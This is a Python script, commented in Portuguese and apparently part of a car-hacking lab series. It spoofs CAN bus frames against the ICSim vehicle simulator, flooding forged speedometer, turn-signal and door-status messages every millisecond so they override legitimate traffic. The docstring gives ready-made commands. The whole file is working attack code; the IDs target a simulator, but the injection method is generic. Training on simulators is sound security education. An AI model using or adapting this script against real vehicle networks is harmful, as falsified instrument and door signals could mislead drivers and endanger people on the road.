#!/usr/bin/env python3
"""
Forjar quadros legítimos com valores manipulados. A injeção é feita em 
alta frequência (default 1 ms), sobrescrevendo as mensagens legítimas 
por simples superioridade de taxa.

IDs do ICSim (do zombieCraig/ICSim):
    0x244  -> Velocímetro (bytes [3:5] = velocidade em little-endian)
    0x188  -> Setas       (byte 2: bit 0 = direita, bit 1 = esquerda)
    0x19B  -> Portas      (byte 2: bits 0-3 = portas FL/FR/RL/RR)

    Testes:
    # Cravar velocímetro em 220 km/h por 30s
    python3 04_spoofing_attack.py --iface vcan0 --target speed \\
            --value 220 --duration 30

    # Acender setas alternadas (efeito flicker)
    python3 04_spoofing_attack.py --iface vcan0 --target signals \\
            --pattern flicker --duration 30

    # Abrir todas as portas
    python3 04_spoofing_attack.py --iface vcan0 --target doors \\
            --value 0x0F --duration 30
"""

import argparse
import sys
import time
import can

# IDs do ICSim
ID_SPEED = 0x244
ID_SIGNAL = 0x188
ID_DOORS = 0x19B


def build_speed_frame(kmh: int) -> can.Message:
    # ICSim multiplica por ~100 e armazena em little-endian nos bytes 3-4
    raw = max(0, min(int(kmh * 100), 0xFFFF))
    payload = bytearray(8)
    payload[3] = raw & 0xFF
    payload[4] = (raw >> 8) & 0xFF
    return can.Message(
        arbitration_id=ID_SPEED, data=bytes(payload), is_extended_id=False
    )


def build_signal_frame(left: bool, right: bool) -> can.Message:
    payload = bytearray(8)
    payload[2] = (0x01 if right else 0) | (0x02 if left else 0)
    return can.Message(
        arbitration_id=ID_SIGNAL, data=bytes(payload), is_extended_id=False
    )


def build_doors_frame(mask: int) -> can.Message:
    payload = bytearray(8)
    payload[2] = mask & 0x0F
    return can.Message(
        arbitration_id=ID_DOORS, data=bytes(payload), is_extended_id=False
    )


def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(description="Spoofing direcionado em ICSim")
    p.add_argument("--iface", default="vcan0")
    p.add_argument(
        "--target",
        choices=["speed", "signals", "doors"],
        required=True,
        help="ECU virtual a ser falsificada",
    )
    p.add_argument(
        "--value",
        type=lambda x: int(x, 0),
        default=0,
        help="Valor a injetar (km/h para speed, máscara para doors)",
    )
    p.add_argument(
        "--pattern",
        choices=["fixed", "flicker"],
        default="fixed",
        help="Padrão para setas: fixed ou flicker",
    )
    p.add_argument("--duration", type=float, default=30.0)
    p.add_argument(
        "--rate", type=float, default=1.0, help="Intervalo entre injeções em ms"
    )
    return p.parse_args()


def main() -> None:
    args = parse_args()
    bus = can.interface.Bus(channel=args.iface, interface="socketcan")
    interval_s = args.rate / 1000.0

    print(
        f"[INFO] Spoofing alvo={args.target} | valor={args.value} | "
        f"duração={args.duration}s | intervalo={args.rate}ms"
    )

    sent = 0
    flicker_state = False
    t0 = time.perf_counter()
    deadline = t0 + args.duration

    try:
        while time.perf_counter() < deadline:
            if args.target == "speed":
                msg = build_speed_frame(args.value)
            elif args.target == "doors":
                msg = build_doors_frame(args.value)
            else:  # signals
                if args.pattern == "flicker":
                    flicker_state = not flicker_state
                    msg = build_signal_frame(flicker_state, not flicker_state)
                else:
                    msg = build_signal_frame(
                        bool(args.value & 0x02), bool(args.value & 0x01)
                    )
            try:
                bus.send(msg)
                sent += 1
            except can.CanError:
                pass
            if interval_s > 0:
                time.sleep(interval_s)
    except KeyboardInterrupt:
        print("\n[INFO] Interrompido pelo usuário.")
    finally:
        elapsed = time.perf_counter() - t0
        bus.shutdown()
        print(
            f"[RESULTADO] Frames spoofados: {sent} | "
            f"Tempo: {elapsed:.3f}s | "
            f"Taxa média: {sent/elapsed:.0f} fps"
        )


if __name__ == "__main__":
    main()
